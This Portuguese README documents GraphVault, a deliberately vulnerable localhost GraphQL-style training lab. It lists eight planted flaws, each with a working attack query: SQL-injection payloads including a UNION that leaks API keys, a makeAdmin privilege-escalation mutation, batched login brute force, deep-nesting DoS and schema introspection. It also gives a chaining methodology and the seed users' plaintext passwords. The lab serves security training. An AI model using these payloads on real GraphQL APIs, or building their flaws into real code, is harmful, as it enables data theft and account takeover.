# GraphVault — Laboratório de API estilo GraphQL, vulnerável de propósito

> ⚠️ **VULNERÁVEL DE PROPÓSITO. Somente localhost.**
> Este servidor planta vulnerabilidades reais e exploráveis de propósito, para
> treino de segurança. **Nunca** o exponha a uma rede. Todos os segredos, chaves
> de API, SSNs e senhas são valores de **marcador / não reais**.

O GraphVault é um laboratório de arquivo único, só com a biblioteca padrão
(`http.server` + `sqlite3` + `json` + `re`) que *simula* uma API GraphQL. **Não**
é um motor GraphQL real — ele reconhece um punhado de formatos específicos de
query/mutation por regex e análise de string e responde com JSON no estilo
GraphQL (`{"data": {...}}` ou `{"errors":[{"message":"..."}]}`). O objetivo é
praticar técnicas de ataque específicas de GraphQL (abuso de introspecção,
BOLA/BFLA, exposição excessiva de dados, força bruta por batching, injeção pelos
argumentos, negação de serviço por aninhamento, vazamento de informação por erros
verbosos).

## Como rodar

```bash
python app.py
# -> GraphVault escutando em http://127.0.0.1:18807  (POST /graphql)
```

- `GET  /`        — pequeno índice JSON anunciando o endpoint `/graphql`.
- `POST /graphql` — corpo JSON `{"query": "...", "variables": {...}}`.

Exemplo:

```bash
curl -s http://127.0.0.1:18807/
curl -s -X POST http://127.0.0.1:18807/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id: 2) { username email ssn } }"}'
```

## Usuários de semente

SQLite em memória, populado na inicialização. As senhas são armazenadas como
hashes **MD5** (fraco de propósito). Todos os valores abaixo são **falsos /
marcadores**.

| id | username | password (plano) | role  | email                  | ssn         | apiKey (marcador)               |
|----|----------|------------------|-------|------------------------|-------------|---------------------------------|
| 1  | alice    | `password1`      | user  | alice@graphvault.lab   | 111-11-1111 | `gv_live_AAAA1111placeholder`   |
| 2  | bob      | `hunter2`        | user  | bob@graphvault.lab     | 222-22-2222 | `gv_live_BBBB2222placeholder`   |
| 3  | carol    | `letmein`        | user  | carol@graphvault.lab   | 333-33-3333 | `gv_live_CCCC3333placeholder`   |
| 4  | admin    | `s3cr3tAdmin`    | admin | admin@graphvault.lab   | 444-44-4444 | `gv_live_DDDD4444placeholder`   |

Relação `friends` (para as queries aninhadas resolverem):
`alice↔{bob,carol}`, `bob↔{alice,admin}`, `carol↔{alice,admin}`, `admin↔{bob,carol}`.

Campos do tipo User que o cliente pode pedir:
`id, username, passwordHash, email, ssn, apiKey, role, friends`.

## Vulnerabilidades plantadas (G1–G8)

Todas as vulnerabilidades ficam em `POST /graphql`.

| ID | Nome | Rota | Exemplo de query / mutation | Impacto |
|----|------|------|-----------------------------|---------|
| **G1** | Introspecção habilitada | `/graphql` | `{"query":"{ __schema { types { name fields { name } } queryType { name } mutationType { name } } }"}` | O schema completo (inclusive os campos sensíveis `passwordHash`/`ssn`/`apiKey` e as mutations perigosas `makeAdmin`/`login`) é divulgado. Produção deveria desabilitar a introspecção. |
| **G2** | BOLA (autorização quebrada em nível de objeto) | `/graphql` | `{"query":"{ user(id: 2) { id username email ssn } }"}` | O registro completo de qualquer usuário é devolvido por id **sem** verificação de propriedade ou autenticação. |
| **G3** | Exposição excessiva de dados | `/graphql` | `{"query":"{ users { username passwordHash ssn apiKey } }"}` | O tipo User deixa clientes pedirem `passwordHash`, `ssn`, `apiKey` — credenciais/PII/segredos vazam diretamente. |
| **G4** | BFLA (autorização quebrada em nível de função) | `/graphql` | `{"query":"mutation { makeAdmin(username: \"bob\") { username role } }"}` | Escalada de privilégio: qualquer chamador promove qualquer usuário a `admin`, sem checar o papel de quem chama. |
| **G5** | Sem limite de taxa + batching de query | `/graphql` | `{"query":"mutation { a: login(username: \"admin\", password: \"admin\") b: login(username: \"admin\", password: \"s3cr3tAdmin\") c: login(username: \"admin\", password: \"password\") }"}` | Todas as chamadas `login` com alias executam numa requisição → força bruta de senha, sem limitação ou bloqueio. |
| **G6** | Sem limite de profundidade/complexidade (DoS) | `/graphql` | `{"query":"{ user(id:1){ friends{ friends{ friends{ friends{ friends{ username }}}}}} }"}` | Queries aninhadas arbitrariamente profundas são aceitas e processadas — sem rejeição por profundidade/complexidade (exaustão de recursos / DoS). A recursão é internamente limitada a ~25 só para não travar de fato; o servidor nunca devolve um erro de limite de profundidade. |
| **G7** | Injeção de SQL pelo argumento do GraphQL | `/graphql` | `{"query":"{ search(filter: \"x' OR '1'='1\") { username } }"}` e `{"query":"{ search(filter: \"x' UNION SELECT apiKey FROM users--\") { username } }"}` | O argumento `filter` é concatenado por string em `SELECT username FROM users WHERE username LIKE '%<filter>'`. A injeção booleana (`x' OR '1'='1`) despeja todos os usuários; a UNION (`x' UNION SELECT apiKey FROM users--`) vaza qualquer coluna (por exemplo `apiKey`); os erros de SQL vazam literalmente. |
| **G8** | Erros verbosos + sugestão de campos | `/graphql` | `{"query":"{ user(id:1){ usernam } }"}` → `Cannot query field "usernam" on type "User". Did you mean "username"?` | Erros de digitação de campo devolvem sugestões "Did you mean" do GraphQL e entrada malformada devolve um traceback verboso em `errors` — detalhes de schema/internos vazam mesmo com a introspecção desligada. |

## Notas / dicas de metodologia

- G1 → enumere o schema, depois conduza G2/G3/G4 contra os campos/mutations que ele revela.
- G3 + G2 combinam: `{ users { username passwordHash } }` despeja todo hash MD5 → quebre offline (`password1`, `hunter2`, `letmein`, `s3cr3tAdmin`).
- G5 permite confirmar senhas quebradas/adivinhadas em lote pelos aliases em batch.
- G4 escala qualquer conta para `admin`.
- G7 é o caminho mais limpo de exfiltração de `apiKey`/`ssn` via `UNION`.
- G6 e G8 são problemas de informação/disponibilidade que ampliam a superfície de ataque.

## Encerramento

Pare com `Ctrl+C`. O servidor escuta em `127.0.0.1:18807` com
`allow_reuse_address=True`, então pode ser reiniciado na hora.
